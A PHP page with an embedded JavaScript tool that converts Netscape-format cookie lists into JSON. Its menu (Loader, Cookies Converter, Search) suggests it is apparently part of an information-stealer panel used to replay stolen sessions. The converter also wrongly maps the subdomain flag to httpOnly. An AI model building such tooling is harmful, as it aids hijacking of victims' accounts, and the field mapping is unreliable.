<?php 
   session_start();
   include 'database.php';
	require_once("auth.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>Converter</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css"
          integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
    <link href="assets/css/app.min.css" rel="stylesheet" type="text/css"/>
</head>

<header id="topnav">
    <div class="topbar-menu">
        <div class="container-fluid">
            <div id="navigation">
                <ul class="navigation-menu">
                    <li>
                        <a href="index.php">
                            <i class="fas fa-hashtag"></i>Dashboard</a>
                    </li>

                    <li>
                        <a href="loader.php">
                            <i class="fas fa-tasks"></i>Loader</a>
                    </li>

                    <li>
                        <a href="converter.php">
                            <i class="fas fa-arrows-alt-h"></i>Cookies Converter</a>
                    </li>
					<li>
                     <a href="search.php">
                     <i class="fas fa-search"></i>Search</a>
                  </li>
				  <li>
                     <a href="settings.php">
                     <i class="fas fa-cogs"></i>Settings</a>
                  </li>
                </ul>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</header>

<script type="text/javascript">
    window.onload = function () {
        document.getElementById("textarea1").wrap = 'off';
    };

    function NetscapeToJson() {
        var textArea2 = document.getElementById("textarea2");
        textArea2.value = '';
        var arrObjects = [];
        var textArea1 = document.getElementById("textarea1");
        var arrayOfLines = textArea1.value.split("\n");
        var i = 0;
        for (i = 0; i < arrayOfLines.length; i++) {
            var kuka = arrayOfLines[i].split("\t");
            var cookie = {};
            cookie.domain = kuka[0];
            cookie.expirationDate = parseInt(kuka[4]);

            if (kuka[1] == "FALSE") cookie.httpOnly = false;
            if (kuka[1] == "TRUE") cookie.httpOnly = true;

            cookie.name = kuka[5];
            cookie.path = kuka[2];

            if (kuka[3] == "FALSE") cookie.secure = false;
            if (kuka[3] == "TRUE") cookie.secure = true;


            cookie.value = kuka[6];


            arrObjects[i] = cookie;
        }

        var cookieStr = JSON.stringify(arrObjects);

        textArea2.value = cookieStr;
    }
</script>
<div class="wrapper">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
                        <h3>NETSCAPE: </h3>
                        <textarea id="textarea1" wrap="soft" class="form-control" rows="20" style="width: 100%"
                                  onclick="this.select()"></textarea>
                        <br>
                        <button onclick="NetscapeToJson()" type="button" class="btn btn-success">Convert</button>
                        <br>
                        <br>
                        <h3>JSON: </h3>
                        <textarea id="textarea2" wrap="soft" class="form-control" rows="20" style="width: 100%"
                                  onclick="this.select()"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>